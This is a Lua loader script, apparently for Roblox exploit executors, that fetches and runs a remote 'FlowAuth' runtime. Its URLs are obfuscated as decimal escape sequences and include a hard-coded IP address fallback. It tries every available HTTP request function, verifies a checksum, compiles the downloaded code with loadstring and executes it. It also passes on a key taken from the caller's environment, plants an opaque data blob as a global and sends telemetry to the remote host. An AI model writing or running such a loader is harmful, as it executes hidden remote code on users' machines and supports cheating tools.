local credential=...
local type,pcall,error,tostring,tonumber=type,pcall,error,tostring,tonumber
local rawset,getfenv=rawset,getfenv
local globals,host=_G,game
local byte,gsub,find=string.byte,string.gsub,string.find
local wait=type(task)=="table"and task.wait
local clock=os.clock
local compile=loadstring
local function member(value,key)
local ok,result=pcall(function()return value[key]end)
if ok then return result end
end
local keyless=true
if keyless then
credential=""
elseif type(credential)~="string"then
for lv=2,4 do
local f,sc=pcall(getfenv,lv)
local v=f and type(sc)=="table"and member(sc,"script_key")
if type(v)=="string"then credential=v;pcall(rawset,sc,"script_key",nil);break end
end
end
local spawn=member(task,"spawn")
local fetch=member(host,"HttpGet")
local ok,senv=pcall(function()return getfenv()end)
if not ok or type(senv)~="table"then senv=globals end
local ok,environment=pcall(function()return getgenv()end)
if not ok or type(environment)~="table"then environment=senv end
local function global(key)return member(environment,key)or member(senv,key)or member(globals,key)end
local sample=20
local platform="?"
pcall(function()
local input=host:GetService("UserInputService")
platform=input.TouchEnabled and not input.KeyboardEnabled and"m"or"d"
end)
local function ms(x)return math.floor(x*1000+.5)end
local reqs,seen={},{}
local function add(fn,name)
if type(fn)=="function"and not seen[fn]then seen[fn]=true;reqs[#reqs+1]={fn,name}end
end
add(global("request"),"request")
add(global("http_request"),"http_request")
add(global("httpRequest"),"httpRequest")
add(global("httprequest"),"httprequest")
add(member(global("http"),"request"),"http.request")
add(member(global("syn"),"request"),"syn.request")
local bt=member(global("buffer"),"tostring")
local url="\104\116\116\112\115\58\47\47\102\108\111\119\97\117\116\104\46\110\101\116\47\97\115\115\101\116\115\47\102\108\111\119\97\117\116\104\47\115\104\97\50\53\54\47\100\99\54\53\97\102\55\56\54\57\56\50\56\55\98\99\50\49\53\49\98\97\102\100\98\100\54\55\49\53\52\48\54\100\53\51\53\102\102\53\100\52\98\102\51\54\53\55\50\50\100\56\102\54\54\102\102\48\97\102\51\101\55\98\47\118\52\95\98\111\111\116\115\116\114\97\112\112\101\114\95\109\97\114\98\101\103\46\108\117\97"
local fallback="\104\116\116\112\115\58\47\47\51\55\46\49\56\55\46\49\51\54\46\49\56\55\47\97\115\115\101\116\115\47\102\108\111\119\97\117\116\104\47\115\104\97\50\53\54\47\100\99\54\53\97\102\55\56\54\57\56\50\56\55\98\99\50\49\53\49\98\97\102\100\98\100\54\55\49\53\52\48\54\100\53\51\53\102\102\53\100\52\98\102\51\54\53\55\50\50\100\56\102\54\54\102\102\48\97\102\51\101\55\98\47\118\52\95\98\111\111\116\115\116\114\97\112\112\101\114\95\109\97\114\98\101\103\46\108\117\97"
local fresh=url.."?retry=2b1ccdca2e15d0fc"
local retry=gsub(url,"/sha256/[a-f0-9]+/","/").."?retry=2b1ccdca2e15d0fc"
local expected=632423
local runtime,reason,issue,pr=nil,nil,"timed out",0
local transport,issueTransport="HttpGet","HttpGet"
local function problem(message,rank)
if rank>=pr then issue,pr,issueTransport=message,rank,transport end
end
local arrived,ck,cm=0,0,0
local function accept(value)
local began=clock()
if type(value)=="buffer"then local ok,text=pcall(bt,value);value=ok and text or nil end
if type(value)~="string"then problem("unsupported response body",1);return end
if #value~=expected then
if #value<1024 and find(value,"Failed to send HTTP request.",1,true)then
problem(find(value,"timed out",1,true)and"HTTP request timed out"or"HTTP request failed",2)
else problem("received "..#value.." bytes; expected "..expected,2)end
return
end
local s1,s2,i=1.0,0.0,1
while i+7<=#value do
local a,b,c,d,e,f,g,h=byte(value,i,i+7)
s2=(s2+8*s1+8*a+7*b+6*c+5*d+4*e+3*f+2*g+h)%65521
s1=(s1+a+b+c+d+e+f+g+h)%65521;i=i+8
end
while i<=#value do s1=(s1+byte(value,i))%65521;s2=(s2+s1)%65521;i=i+1 end
if s2*65536.0+s1~=3646516830 then problem("runtime checksum mismatch",3);return end
local t=clock();ck=t-began
local ok,compiled,detail=pcall(compile,value,"=FlowAuthRuntime")
local text=not(ok and type(compiled)=="function")and tostring(ok and detail or compiled)
if text and not(find(text,"FlowAuthRuntime:")or find(text,"xpected")or find(text,"syntax"))then
if wait then pcall(wait,1.5)end
ok,compiled,detail=pcall(compile,value,"=FlowAuthRuntime")
end
cm=clock()-t
if ok and type(compiled)=="function"then runtime=compiled;return true end
reason=(ok and detail or compiled)or"compiler returned no function";issueTransport=transport
return false
end
local cs={{fetch,"HttpGet",url}}
if fallback~=""then cs[#cs+1]={fetch,"HttpGet",fallback,true}end
for i=1,#reqs do
local candidate=reqs[i]
if fallback~=""then cs[#cs+1]={candidate[1],candidate[2],fallback,true}end
cs[#cs+1]={candidate[1],candidate[2],fresh}
end
cs[#cs+1]={fetch,"HttpGet",retry}
local started,ni,ls,idle=clock(),1,0,0
local js,shut,alternate={},false,false
local asynchronous=type(spawn)=="function"and type(wait)=="function"
local function launch()
local candidate=cs[ni];ni=ni+1;ls=clock()
local job={name=candidate[2],alternate=candidate[4]};js[#js+1]=job
local function run()
if shut or job.started then return end
job.started=true
local ok,response
if job.name=="HttpGet"then ok,response=pcall(candidate[1],host,candidate[3])
else ok,response=pcall(candidate[1],{Url=candidate[3],Method="GET"})end
if not shut then job.ok,job.response,job.done=ok,response,true end
end
if asynchronous then
local ok,thread=pcall(spawn,run);job.thread=ok and thread or nil
if not job.started and type(job.thread)~="thread"then asynchronous=false;run()end
else run()end
end
launch()
for poll=1,4000 do
local active,completed=0,false
for i=1,#js do
local job=js[i]
if not job.done then active=active+1
elseif not job.read then
job.read=true;completed=true;transport=job.name;arrived=clock()-started
local response=job.response;job.response=nil
if not job.ok then problem("request failed",1)
elseif type(response)=="table"then
local status=tonumber(member(response,"StatusCode")or member(response,"status_code")or member(response,"Status")or member(response,"status"))or 0
local success=member(response,"Success");if success==nil then success=member(response,"success")end
if status==0 and success==true then status=200 end
if success==false and status<400 then status=500 end
if status>=200 and status<300 then accept(member(response,"Body")or member(response,"body")or member(response,"ResponseBody")or member(response,"response_body"))
else problem("HTTP "..status,2)end
else accept(response)end
if runtime or reason then alternate=job.alternate;break end
end
end
if runtime or reason or(active==0 and ni>#cs)then break end
local t=clock()
if t-started-idle>=40 then problem("HTTP download timed out after 40 seconds",4);break end
if ni<=#cs and(active==0 or(active<2 and(completed or t-ls>=8)))then launch()
elseif not pcall(wait,.03)then problem("HTTP download wait unavailable",4);break
else idle=idle+math.max(clock()-t-1,0)end
end
shut=true
for i=1,#js do js[i].response=nil end
local function send(base,path,body,delay)
local query="?p="..gsub('{"protocol":3,"loader_hash":"\97\53\48\53\102\53\97\56\97\99\57\57\56\51\102\53\101\52\52\51\98\99\100\57\102\53\102\98\49\100\98\102","\108\97\117\110\99\104\95\116\105\99\107\101\116":"\118\50\58\120\118\80\106\99\107\57\55\90\89\89\100\121\77\113\87\58\65\110\51\110\97\99\69\53\45\79\90\100\114\70\68\88\110\75\51\103\87\119\58\105\72\98\75\81\51\71\108\71\85\115\105\121\112\105\54\118\67\97\85\56\122\100\54\101\67\118\97\90\78\82\88\50\71\114\76\57\121\107\50\69\99\104\56\86\77\50\105\54\99\73\98\108\81\101\111\71\112\106\102\106\103\70\78\57\116\116\104\114\110\79\45\81\95\80\80\74\65\85\104\53\56\116\51\68\118\72\70\102\75\55\48\95\113\97\110\106\108\71\79\117\53\50\90\68\117\112\116\74\103\102\52\97\45\65\65\80\115\95\49\111\85\49\78\66\117\95\57\51\114\108\57\120\103\105\108\109\119\108\66\101\119\70\122\80\104\70\72\109\115\48\50\122\68\103\95\100\78\105\97\120\105\95\45\56\99\53\70\102\83\95\100\79\102\65\114\83\66\57\98\120\90\88\85\54\119\77\77\51\117\65\111\112\111\52\81\81\81\118\95","stage":"'..body,"[^%w]",function(c)return string.format("%%%02X",byte(c))end)
pcall(spawn,function()
if delay then pcall(wait,delay)end
local target=gsub(base,"/assets/.*",path)..query
if not pcall(fetch,host,target)and reqs[1]then pcall(reqs[1][1],{Url=target,Method="GET"})end
end)
end
if not runtime then
pcall(function()
local text=gsub(issueTransport..": "..tostring(reason or issue),"[^%w .:;,()=/_-]","?")
local body=(reason and"launcher_load"or"launcher_download")..'","executor":"launcher","diag":["pf='..platform..'"],"error":"'..string.sub(text,1,160)..'"}'
for _,base in ipairs{url,fallback}do
if base~=""then send(base,"/v1/telemetry/executor",body)end
end
end)
if reason then error("FlowAuth runtime compilation failed: "..tostring(reason),0)end
error("FlowAuth runtime download failed ("..issueTransport.."): "..tostring(issue)..". Please run the loader again.",0)
end
if sample>0 and spawn and math.random(sample)==1 then
pcall(send,alternate and fallback or url,"/v1/telemetry/load",'load","pf":"'..platform..'","tp":"'..transport..'","fb":'..(alternate and 1 or 0)..',"tr":'..#js..',"dl":'..ms(arrived)..',"ck":'..ms(ck)..',"cm":'..ms(cm)..',"w":'..sample..'}',2)
end
if asynchronous then pcall(wait)end
local handoff=alternate and {"\91\229\177\5\148\78\175\16\248\29\235\54\55\117\179\91\193\107\26\156\231\202\87\221\84\206\238\255\31\254\93\211\245\30\135\157\98\34\132\223\179\11\192\48\76\156\38\201\181\205\244\27\31\222\121\18\15\136\92\234\103\198\94\23\89\71\237\110\223\216\192\49\140\6\145\136\72\201\117\228\240\133\242\102\143\8\222\8\106\113\31\29\6\162\96\217\225\91\144\25\252\90\176\211\120\147\13\27\12\157\146\255\253\52\145\112\84\31\171\57\113\174\203\0\221\79\43\235\45\255\218\228\251\67\104\162\181\225\59\66\86\29\22\179\100\200\137\219\80\239\153\25\134\254\212\0\54\91\51\236\94\194\114\237\143\140\131\31\139\221\9\49\185\35\150\23\198\218\224\137\117\69\112\238\162\182\14\46\40\135\63\101\35\26\225\154\32\55\155\141\15\135\140\195\221\110\161\46\17\138\134\246\112\230\15\129\150\146\231\78\209\8\197\63\155\196\76\114\184\167\174\117\80\201\57\182\164\186\208\119\167\181\172\184\122\197\208\153\93\222\140\185\214\155\16\138\102\112\236\219\31\111\147\109\212\194\243\139\254\173\155\64\122\241\39\7\246\219\165\120\62\193\89\42\170\159\168\49\3\2\137\129\230\193\242\246\247\74\233\221\105\171\26\96\166\119\204",3206961517,3920454639} or {"\211\181\177\248\80\165\13\155\253\138\154\113\12\78\154\57\14\12\232\113\59\219\123\154\40\193\80\223\59\134\251\49\182\231\38\131\248\48\24\84\94\83\216\38\140\61\122\222\144\29\58\183\80\44\52\195\71\129\50\168\233\196\8\52\134\216\128\165\166\239\140\59\145\217\216\30\222\103\229\246\220\227\232\214\166\176\6\190\189\94\141\189\95\161\162\10\48\74\98\254\134\160\218\157\174\163\199\138\235\145\128\153\174\157\48\58\222\51\255\214\166\151\153\190\73\157\127\139\99\80\175\75\188\163\139\23\200\213\190\202\233\154\37\163\180\112\176\49\47\40\102\210\233\26\140\116\174\216\59\50\90\72\252\209\114\177\56\193\250\101\134\93\1\217\231\190\102\174\167\201\192\14\138\234\16\97\34\13\20\96\105\23\66\216\215\102\0\111\146\225\236\135\90\8\39\180\184\131\189\107\4\89\43\51\66\84\179\169\215\31\134\100\84\49\86\106\212\13\240\100\176\137\145\219\33\188\226\134\197\84\15\99\10\237\27\231\118\220\130\13\227\193\167\36\181\68\206\130\17\163\12\93\133\231\9\222\238\230\250\205\69\59\200\193\190\134\220\23\232\187\75\243\140\176\43\188\112\11\159\29\151\31\237\215\163\245\152\22\91\194\40\75\184\4\91",2358410008,3592971774}
local function publish(target)
if type(target)=="table"then pcall(rawset,target,"_bsdata0",handoff)end
end
publish(environment)
publish(globals)
_bsdata0=handoff
pcall(function()publish(getfenv(runtime))end)
handoff=nil
return runtime(credential)
